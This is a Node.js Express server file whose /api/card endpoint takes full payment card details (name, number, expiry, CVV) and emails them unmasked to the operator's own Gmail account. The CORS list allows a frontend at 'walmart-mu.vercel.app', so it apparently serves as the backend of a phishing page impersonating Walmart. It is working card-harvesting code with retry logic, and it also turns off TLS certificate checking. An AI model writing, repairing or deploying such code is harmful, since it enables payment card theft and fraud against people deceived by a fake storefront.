// HOW TO HOST LOCALLY: npm install && node api.js[](http://localhost:3000)
// For Render: Set GMAIL_USER/GMAIL_PASS in dashboard. No fs/sendmail.

const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();

// Load local .env in development (optional). Ensure .env is in .gitignore and don't commit secrets.
require('dotenv').config();

const allowedOrigins = [
  'http://127.0.0.1:5500',
  'http://localhost:5500',
  'https://walmart-mu.vercel.app',
  'https://walmartbackend-i8tm.onrender.com'
];

app.use(cors({
  origin: function(origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  optionsSuccessStatus: 200
}));

app.use(express.json());

app.use((req, res, next) => {
  const origin = req.headers.origin;
  console.log('Incoming request from origin:', origin); // Debug
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

console.log('CORS allowed origins:', allowedOrigins);

app.options('/api/card', (req, res) => res.sendStatus(200));

app.post('/api/card', async (req, res) => {
  const { cardName, cardNumber, expiry, cvv } = req.body;
  // Avoid logging sensitive full card data. Mask all but last 4 digits if available.
  const maskedCard = cardNumber ? String(cardNumber).replace(/\d(?=\d{4})/g, '*') : 'N/A';
  console.log('Received card submission:', { cardName, cardNumber: maskedCard, expiry });

  if (!cardName || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const gmailUser = process.env.GMAIL_USER;
  const gmailPass = process.env.GMAIL_PASS;

  if (!gmailUser || !gmailPass) {
    console.warn('Missing GMAIL creds - mocking success for dev');
    return res.json({ success: true, message: 'Mock: Email would be sent (creds missing)' });
  }

  // Create transporter per-request (safe for serverless/persistent)
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: gmailUser, pass: gmailPass },
    requireTLS: true,
    // Increase timeouts to reduce ETIMEDOUT on slow networks
    connectionTimeout: 60000, // ms
    greetingTimeout: 30000,
    socketTimeout: 60000,
    tls: {
      // allow self-signed during restrictive environments (optional)
      rejectUnauthorized: false
    }
  });

  const mailOptions = {
    from: gmailUser,
    to: gmailUser,
    subject: 'New Card Submission',
    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
  };

  // Helper: small sleep for backoff
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

  // Retry send with exponential backoff for transient errors
  async function sendMailWithRetries(trans, mail, attempts = 3) {
    let lastErr;
    for (let i = 0; i < attempts; i++) {
      try {
        // Verify connection/auth before sending on first attempt
        if (i === 0) {
          await trans.verify();
        }
        const info = await trans.sendMail(mail);
        return info;
      } catch (err) {
        lastErr = err;
        const retriable = ['ETIMEDOUT', 'EAI_AGAIN', 'ECONNRESET', 'ENOTFOUND'].includes(err && err.code);
        console.warn(`sendMail attempt ${i + 1} failed, code=${err && err.code}: ${err && err.message}`);
        if (!retriable) break;
        // backoff: 500ms * 2^i
        await sleep(500 * Math.pow(2, i));
      }
    }
    throw lastErr;
  }

  try {
    const info = await sendMailWithRetries(transporter, mailOptions, 3);
    console.log('Email sent:', info && (info.response || info.messageId));
    res.json({ success: true, message: 'Email sent', info: info && (info.response || info.messageId) });
  } catch (err) {
    console.error('Email error:', {
      message: err && err.message,
      code: err && err.code,
      command: err && err.command,
      response: err && err.response
    });
    // close transporter if available
    try { transporter.close && transporter.close(); } catch (_) {}
    res.status(500).json({
      error: 'Failed to send email',
      details: err && err.message,
      code: err && err.code,
      command: err && err.command
    });
  }
});

app.get('/api/health', (req, res) => {
  res.json({ ok: true, env: process.env.NODE_ENV || 'development' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`API server running on host 0.0.0.0 and port ${PORT}`);
});